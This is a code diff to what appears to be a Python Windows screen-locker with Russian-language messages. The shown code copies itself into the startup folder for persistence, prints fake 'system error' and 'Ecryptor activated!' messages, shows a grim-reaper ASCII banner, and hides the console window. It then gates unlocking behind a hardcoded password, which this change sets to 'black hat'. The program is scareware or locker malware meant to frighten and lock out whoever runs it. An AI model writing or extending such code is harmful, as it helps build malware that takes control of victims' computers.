@@ -37,13 +37,36 @@ def add_to_startup_folder():
     try:
         shutil.copy2(script_path, startup_folder)
     except Exception as e:
-        print(f"!✗ Ошибка: {e}")
-
+         print("ошибка автозагрузки!")
 print("00x(2)00003 system error")
 print("00x1003")
 time.sleep(0.2)
 print("000x300002")
 print("000x0004200 Ecryptor activated!")
+time.sleep(1)
+os.system('cls' if os.name == 'nt' else 'clear')
+print(r"""
+            ;::::; 
+           ;::::; :; 
+         ;:::::'   :; 
+        ;:::::;     ;. 
+       ,:::::'       ;           OOO\ 
+       ::::::;       ;          OOOOO\ 
+       ;:::::;       ;         OOOOOOOO 
+      ,;::::::;     ;'         / OOOOOOO 
+    ;:::::::::`. ,,,;.        /  / DOOOOOO 
+  .';:::::::::::::::::;,     /  /     DOOOO 
+,::::::;::::::;;;;::::;,   /  /        DOOO 
+;`::::::`'::::::;;;::::: ,#/  /          DOOO 
+:`:::::::`;::::::;;::: ;::#  /            DOOO 
+::`:::::::`;:::::::: ;::::# /              DOO 
+`:`:::::::`;:::::: ;::::::#/               DOO 
+:::`:::::::`;; ;:::::::::##                OO 
+::::`:::::::`;::::::::;:::#                OO 
+`:::::`::::::::::::;'`:;::#                O 
+  `:::::`::::::::;' /  / `:# 
+   ::::::`:::::;'  /  /   `#
+      """)
 
 time.sleep(0.5)
 
@@ -51,7 +74,7 @@ ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def check_input(event=None):
     user_input = entry.get().strip()  
-    if user_input == f"{parol}":  
+    if user_input == "black hat":  
         messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
         root.destroy() 
     else:
